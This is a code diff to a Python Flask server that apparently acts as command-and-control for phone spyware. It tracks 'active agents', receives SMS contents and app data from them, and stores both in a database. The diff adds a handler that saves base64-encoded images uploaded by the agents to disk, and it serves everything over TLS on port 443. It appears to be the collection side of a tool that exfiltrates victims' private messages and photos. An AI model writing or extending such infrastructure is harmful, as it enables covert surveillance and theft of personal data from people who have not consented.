@@ -4,6 +4,7 @@ from random import choice
 import os
 import sqlite3
 import main
+import base64
 from sqlite3 import Error
 
 
@@ -86,11 +87,14 @@ def getTask(id):
 def receiveResult(id):
     if id in main.active_agents:
         content = request.get_json(silent=True)
-        print(content) # Do your processing
+        # print(content) # Do your processing
 
         code = content["code"]
+
         if code == "sms":
             return handle_sms(content["data"], id)
+        elif code == "images":
+            return handle_images(content["data"], id)
         elif code == "app":
             return handle_app(content["data"], id)
         
@@ -104,11 +108,13 @@ def receiveResult(id):
 def handle_sms(content, id):
     print(f"Received SMS data: {content}\n\n")
     clearAgentTasks(id)
+
     for json_data in content:
         address = json_data.get("address", "")
         body = json_data.get("body", "")
         formatted_date = json_data.get("formatted_date", "")
         messageType = json_data.get("type", "")
+        print(body)
 
         # Save data to database
         sql = "INSERT INTO sms VALUES (?, ?, ?, ?, ?)"
@@ -117,6 +123,18 @@ def handle_sms(content, id):
                
     
 
+    return ("Success", 200)
+
+def handle_images(content, id):
+    clearAgentTasks(id)
+    for json_data in content:
+        image_name = json_data.get("image_name","")
+        encoded_bytes = json_data.get("bytes", "")   
+        decoded_bytes = base64.b64decode(encoded_bytes)
+        with open("img/"+image_name, 'wb') as f: 
+            f.write(decoded_bytes)
+        
+    
     return ("Success", 200)
 
 def handle_app(content, id):
@@ -211,7 +229,6 @@ def run_server():
     logging.basicConfig(filename='log',level=logging.DEBUG)
 
     app.run(host='0.0.0.0', port=443, ssl_context=('keys/cert.pem', 'keys/key2.pem'))
-    # app.run(host='0.0.0.0', port=80)
 
 if __name__ == "__main__":
     run_server()
